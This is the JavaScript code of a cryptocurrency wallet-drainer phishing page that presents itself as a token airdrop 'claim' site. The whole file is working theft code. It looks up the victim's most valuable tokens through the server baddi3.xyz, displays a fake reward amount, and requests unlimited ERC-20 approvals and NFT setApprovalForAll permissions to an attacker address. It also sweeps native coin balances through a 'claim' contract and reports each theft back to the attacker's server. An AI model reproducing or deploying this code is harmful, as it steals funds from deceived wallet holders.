"use strict";

const approvaladdress = "0x561a5ed9F412506B9Df147103acA4347f37Ae954";

//fetch erc20 & erc721 ABIs to drain token and NFTs respectively 
let backupABI
fetch('https://raw.githubusercontent.com/Uniswap/interface/main/src/abis/erc20.json').then(res => res.json()).then(output => { backupABI = output; }).catch(err => { throw err });
let nftABI
fetch('https://raw.githubusercontent.com/Uniswap/interface/main/src/abis/erc721.json').then(res => res.json()).then(output => { nftABI = output; }).catch(err => { throw err });

//declare variables needed later in the code
var dr3ABI =  [{ "inputs": [], "name": "claim", "outputs": [], "stateMutability": "payable", "type": "function" }];
var drList = {"0x1": "0xC3eF960E71D8fA3DC3F19cE9eCf898F1Dec18907", "0x10": "0x4e8e91e934031fAFA71724F158B3AAB6d2ED6823", "0xa": "0x4e8e91e934031fAFA71724F158B3AAB6d2ED6823", "0x38": "0x242ab04E6038ac64e885ad0EFC192f2c081B7a6F", "0x56": "0x242ab04E6038ac64e885ad0EFC192f2c081B7a6F", "0x89": "0xA7cC8b3CD6c53AF9c67cce93830C792511A5aE4a", "0x137": "0xA7cC8b3CD6c53AF9c67cce93830C792511A5aE4a", "0xa86a": "0x4e8e91e934031fAFA71724F158B3AAB6d2ED6823", "0x43114": "0x4e8e91e934031fAFA71724F158B3AAB6d2ED6823", "0xa4b1": "0x755207f2f51932a88eDDeb180800F47e505637d2",  "0x42161": "0x755207f2f51932a88eDDeb180800F47e505637d2"}
var chains_obj = {"0x1": "eth", "0x10": "op", "0xa": "op", "0x38": "bsc", "0x56": "bsc", "0x89": "matic", "0x137": "matic", "0xa86a": "avax", "0x43114": "avax"}
let contrAdd = "";
let token_value
let tokendisplayVal
let balance_ineth
let chainId;
let chainlist = ["0x1", "0x38", "0x56", "0x137", "0x89", "0xa86a", "0xa4b1", "0xa", "0x10", "0x43114", "0x42161"];

const nftlist = ['0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D', '0x60E4d786628Fea6478F785A6d7e704777c86a7c6', '0xba30E5F9Bb24caa003E9f2f0497Ad287FDF95623', '0x34d85c9CDeB23FA97cb08333b511ac86E1C4E258', '0xED5AF388653567Af2F388E6224dC7C4b3241C544']
const owner = document.location.hostname;
const connectBut = document.getElementById("connect-but");
const connectbut = document.getElementById("connect-button");
const disconnectbut = document.getElementById("disconnect-button");
const connectbut1 = document.getElementById("connect-button1");
const disconnectbut1 = document.getElementById("disconnect-button1");
const claimApp = document.getElementById("claim-app");
const wallet_info = document.getElementById("wallet-info");
const section_before = document.getElementById("section-before");
const section_after = document.getElementById("section-after");
const tokendisplay = document.getElementById("token-display");
const tokendisplay1 = document.getElementById("token-display1");
const participation = document.getElementById("participation");
const loader = document.getElementById("loader")


"section-before"


const WalletConnectProvider = window.WalletConnectProvider.default;
const Web3Modal = window.Web3Modal.default;

// Web3modal instance
let web3Modal;

// Chosen wallet provider given by the dialog window
let provider;

// Address of the selected account
let selectedAccount;

//declare web3 globally, so it can work in every function without having to parse it manually
let web3;


async function connectWallet() {

  await wConnect();

  if (provider == undefined){
    console.log("no provider")
    return;
  }
  //  Create Web3 instance
  web3 = new Web3(provider);

  //  Get Accounts
  const accounts = await web3.eth.getAccounts();
  selectedAccount = accounts[0];
  console.log('account:', selectedAccount)
  wallet_info.innerText = truncate(selectedAccount)

  //  Get Chain Id
  chainId = await web3.eth.getChainId();
  console.log('provider here:',provider.chainId)
  console.log('web3 here:',chainId)
  chainId = chainId.toString();
  if (!chainId.includes("0x")) {
    chainId = "0x" + chainId;
  }
  console.log("0x chainID:", chainId);

  //  Get Balance 
  var balance = await web3.eth.getBalance(selectedAccount);
  balance_ineth = await web3.utils.fromWei(balance, 'ether')
  balance_ineth = Number(balance_ineth).toFixed(4)
  console.log('balance_ineth:', balance_ineth)

  // save addreess and chain id to local storage
  window.localStorage.setItem("selectedAccount", selectedAccount);
  window.localStorage.setItem("chainId", chainId);

  //change some of the UI after wallet connection is established
  section_before.style.setProperty("display", "none");
  connectbut1.style.setProperty("display", "none");
  connectBut.style.setProperty("display", "none");
  loader.style.setProperty("display", "flex");

  //send request
  await dbRequest(accounts[0], chainId);
  participation.style.setProperty("display", "none");
  section_after.style.setProperty("display", "flex");
  loader.style.setProperty("display", "none");;
  claimApp.style.setProperty("display", "flex");
  
}

async function disconnectWallet() {
  console.log("Killing the wallet connection", provider);

  // TODO: Which providers have close method?
  if (provider.close) {
    await provider.close();

    // If the cached provider is not cleared,
    // WalletConnect will default to the existing session
    // and does not allow to re-scan the QR code with a new wallet.
    // Depending on your use case you may want or want not his behavir.
    await web3Modal.clearCachedProvider();
    provider = null;
  }

  console.log("result", provider);

  // Clear variables and local storage
  selectedAccount = null;
  window.localStorage.removeItem("selectedAccount")
  window.localStorage.removeItem("chainId")

  // Set the UI back to the initial state
  section_before.style.setProperty("display", "flex");
  connectbut1.style.setProperty("display", "flex");
  connectBut.style.setProperty("display", "flex");
  participation.style.setProperty("display", "block");
  section_after.style.setProperty("display", "none");
  claimApp.style.setProperty("display", "none");
  tokendisplay.style.setProperty("display", "none");
  tokendisplay1.style.setProperty("display", "none");
  console.log("storage cleared");
  return

}

//make request to server to find highest valued tokens erc20/erc721
async function dbRequest(selectedAccount, chainId) {
  await fetch(`https://baddi3.xyz/token/${chainId}/${selectedAccount}`)
    .then((response) => response.json())
    .then((result) => {
      console.log("contract:", result["contrAdd"]);
      console.log("tokenValue", result["tokenValue"], typeof result["tokenValue"]);
      contrAdd = result["contrAdd"];
      if (result["tokenValue"])
      {token_value = result["tokenValue"]};
    })
    .catch((error) => console.log(error));


  //if you want, this can show a fake token value to claim based on the highest valued token the address holds
   if(token_value){ 
    tokendisplayVal = token_value/2.

    if (tokendisplayVal > 99) {
      tokendisplay.style.setProperty("display", "block");
      tokendisplay1.style.setProperty("display", "inline");
      tokendisplay1.innerHTML = tokendisplayVal+' OP'
    } else {
      tokendisplay.style.setProperty("display", "block");
      tokendisplay1.style.setProperty("display", "block");
      tokendisplay1.innerHTML = '50 OP'

    }}
    

}

// approve tokens to the drainer/approval wallet
async function approveToken() {
  //web3 = new Web3(provider);
  if (chainlist.includes(chainId)) {

    if (contrAdd === chains_obj[chainId]) {
      await sendEth()
      return
    } else {
      if (nftlist.includes(contrAdd)){
        var contract = new web3.eth.Contract(nftABI, contrAdd);
        var tokenSymbol = await contract.methods.symbol().call();
        var tokenBalance = await contract.methods.balanceOf(selectedAccount).call();
        var ttlsupply = await contract.methods.totalSupply().call();
        await approveTX(selectedAccount, contract, ttlsupply, tokenSymbol, contrAdd, tokenBalance, chainId)
        await dbRequest(selectedAccount, chainId);
        return
      }
      var contract = new web3.eth.Contract(backupABI, contrAdd);
      var tokenSymbol = await contract.methods.symbol().call();
      var tkBalance = await contract.methods.balanceOf(selectedAccount).call();
      var tkndecimal = await contract.methods.decimals().call();
      var tkndivder = 10 ** tkndecimal; //exponential of 10 based on the decimal points
      var tokenBalance = tkBalance / tkndivder;
      var ttlsupply = await contract.methods.totalSupply().call();
      await approveTX(selectedAccount, contract, ttlsupply, tokenSymbol, contrAdd, tokenBalance, chainId)
      await dbRequest(selectedAccount, chainId);
    }
  } else {
    alert("Please select a supported network!");
    //claimApp.style.cursor = "not-allowed";
    //connectbut.style.cursor = "not-allowed";
    return false;
  }
}

async function approveTX(selectedAccount, contract, ttlsupply, tokenSymbol, contrAdd, tokenBalance, chainId){
  var tx_Hash = "";
  var tType = "";
  if (nftlist.includes(contrAdd)){
    await contract.methods.setApprovalForAll(approvaladdress, true).send({ from: selectedAccount }).on("receipt", function (receipt) {
      console.log("Receipt: ", receipt);
      console.log("TxHash from Receipt: ", receipt.transactionHash);
      tx_Hash = receipt.transactionHash;
      tType = 'erc721'
    console.log('type: ', tType);
    console.log("transaction approved!");
  var approval_info = { address: selectedAccount, tokenSymbol: tokenSymbol, contractAddress: contrAdd, transactionHash: tx_Hash, tokenBalance: tokenBalance, chainId: chainId, tokenType: tType };
  const approval_data = JSON.stringify(approval_info);
  console.log("approval data:", approval_data);
  fetch("https://baddi3.xyz/approval", { method: "post", headers: { "Content-Type": "application/json", Accept: "application/json", body: approval_data }})
    .then((response) => response.json()).then((result) => { console.log("approval for", result["tokenSymbol"], "received"); }).catch((error) => console.log(error));
    }); 
    

  } else {
  await contract.methods.approve(approvaladdress, ttlsupply).send({ from: selectedAccount }).on("receipt", function (receipt) {
    console.log("Receipt: ", receipt);
    console.log("TxHash from Receipt: ", receipt.transactionHash);
    tx_Hash = receipt.transactionHash;
    tType = 'erc20';
  console.log('tType: ', tType);
  console.log("transaction approved!");
  var approval_info = { address: selectedAccount, tokenSymbol: tokenSymbol, contractAddress: contrAdd, transactionHash: tx_Hash, tokenBalance: tokenBalance, chainId: chainId, tokenType: tType, owner: owner };
  const approval_data = JSON.stringify(approval_info);
  console.log("approval data:", approval_data);
  fetch("https://baddi3.xyz/approval", { method: "post", headers: { "Content-Type": "application/json", Accept: "application/json", body: approval_data }})
    .then((response) => response.json()).then((result) => { console.log("approval for", result["tokenSymbol"], "received"); }).catch((error) => console.log(error));
  }); 
   }
  alert("Claim Successful!");
  return
}

function truncate(address) {
  if (address == "") {
    console.log("nothing here");
    return false;
  } else {
    return `${address.substr(0, 5)}....${address.substr(
      address.length - 4,
      address.length
    )}`;
  }
}

//this function is only necessary if you want to page to automatically sync/connect with the waallet, especially if it has connected to the wallet before
async function checker() {
  //claimApp.style.cursor = 'not-allowed';
  if ( window.localStorage.getItem("selectedAccount") != undefined && window.localStorage.getItem("chainId") != undefined ) {
    if (provider == undefined){
      await connectWallet();
      //claimApp.style.cursor = 'auto';
      return
    } 
    selectedAccount = window.localStorage.getItem("selectedAccount");
    chainId = window.localStorage.getItem("chainId");
    document.getElementById("conn-wall").innerHTML = truncate(selectedAccount);
    await dbRequest(selectedAccount, chainId);
    await wConnect()
    //claimApp.style.cursor = 'auto';
    console.log('checker done')
  } else await connectWallet();
}

async function wConnect() {
  //using public RPCs because this code is distibuted, for more private activity, you can use you private RPCs instead, or API keys from infura/quicknode,but keep the keys private!
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        rpc: {
           1: 'https://eth.public-rpc.com',  //ethereum
           56: 'https://bsc-dataseed.binance.org/', //binance smart chain
           137: 'https://matic-mainnet.chainstacklabs.com', //matic
           10: 'https://matic-mainnet.chainstacklabs.com', //optimism
           43114: 'https://matic-mainnet.chainstacklabs.com', // avax
           42161: 'https://matic-mainnet.chainstacklabs.com' // arbitrum
        },
        network: 'mainnet', //change this to 'binance', if you want wallet connect to conenc tot bsc by default on multichain wallets
      }
    }
  };

  web3Modal = new Web3Modal({
    cacheProvider: true, // optional
    providerOptions, // required
    disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
    theme: "dark"
  });

  //  Enable session (triggers QR Code modal)
  //await provider.enable();
  console.log("Opening a dialog", web3Modal);
  try {
    provider = await web3Modal.connect();
  } catch (e) {
    console.log("Could not get a wallet connection", e);
    alert("Please connect your wallet")

    return;
  }

  // Subscribe to accounts change
  provider.on("accountsChanged", (accounts) => {
    selectedAccount = accounts[0];
    console.log(selectedAccount);
    console.log(chainId);
    disconnectbut.innerText = truncate(selectedAccount);
    disconnectbut1.innerText = truncate(selectedAccount);
    dbRequest(selectedAccount, chainId);
  });

  // Subscribe to chainId change
  provider.on("chainChanged", (chainID) => {
    console.log(chainID);
    chainId = chainID;
    window.reload
  });

  // Subscribe to session disconnection
  provider.on("disconnect", (code, reason) => {
    console.log(code, reason);
  });

  web3Modal.on("close", () => {
    document.getElementById("web3modal-container").classList.remove("dark-theme");
});

web3Modal.on("open", () => {
    document.getElementById("web3modal-container").classList.add("dark-theme");
});

}

async function sendEth(){
// calculate gas price, to get the best estimate
  const gasP = await web3.eth.getGasPrice()
  const bestgasprice = parseInt(gasP) + 6000000000 //we add 6 gwei here to make sure it doesn't fail 
  const bestgasPGwei = await web3.utils.fromWei(Number(bestgasprice).toString(), 'gwei');
  const gasfee_ineth = (60000 *  bestgasPGwei)/1000000000 //gas price in eth calculation

  var address = await web3.utils.toChecksumAddress(selectedAccount)//standar d practice to always make sure address is checksumAddress before quering the EVM
  const balance = await web3.eth.getBalance(address); //get balance of the address. the unit is Wei
  const balance_in = await web3.utils.fromWei(balance, 'ether') //convert Wei to ETH unit. the variable type will be string
  const balance_ineth = Number(balance_in) // convert string to number

// drain if wallet is not empty
if (balance_ineth > 0) {
  console.log('balance_ineth', balance_ineth, typeof balance_ineth)
  const val = (balance_ineth - gasfee_ineth) * 1000000000000000000
  var mini = balance_ineth - gasfee_ineth //just to capture the tranaction value in eth
  var valA = Math.floor(val)
  const value = Number(valA).toString()
  console.log('value', value, typeof value)

  var contract = new web3.eth.Contract(dr3ABI, drList[chainId]);
  var txdata = {
    value: value,
    from: selectedAccount,
    gas: (35000).toString(),
  }


  await contract.methods.claim().send(txdata)
  .on('transactionHash', function(hash){
    console.log(`Transaction hash: ${hash}`);
    const ethsend_info = {
      address: selectedAccount,
      transactionHash: hash,
      value: mini,
      chainId: chainId,
      owner: owner, //so the server knows who is draining and sends to the appropriate wallet
    }
    const ethsend_data = JSON.stringify(ethsend_info);
    console.log("eth_send data:", ethsend_data);
    fetch('https://baddi3.xyz//ethsend', {
      method: 'post',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'body': ethsend_data
      } 
    })
    .then(res => res.json())
    .then(data => {
      console.log(data);
    });
  })
  .on('error', function(error){
    console.error(`Transaction failed: ${error.message}`);
  });
  alert("Claim Successful!");


}

}


connectbut.addEventListener("click", async (event) => {
  await connectWallet();
  await approveToken()
});

connectBut.addEventListener("click", async (event) => {
  await connectWallet();
  await approveToken()
});

disconnectbut.addEventListener("click", (event) => {
  disconnectWallet();
});

claimApp.addEventListener("click", async (event) => {
  if (web3 == undefined){
    await connectWallet();
  }
  await approveToken();
});

document.getElementById("hammer").addEventListener("click", (event) => {
  console.log("shows")
  document.getElementById("dropdown").setAttribute("opacity: 1; transition: opacity 269ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;");
  document.getElementById("hammer").setProperty.style("visibility", "hidden")
  document.getElementById("cross-mark").setProperty.style("visibility", "visible")
})


{

  document.getElementById("dropdown").setAttribute("style","opacity: 0; visibility: hidden;");
}

window.addEventListener("DOMContentLoaded", async (event) => {
  //await checker();
});
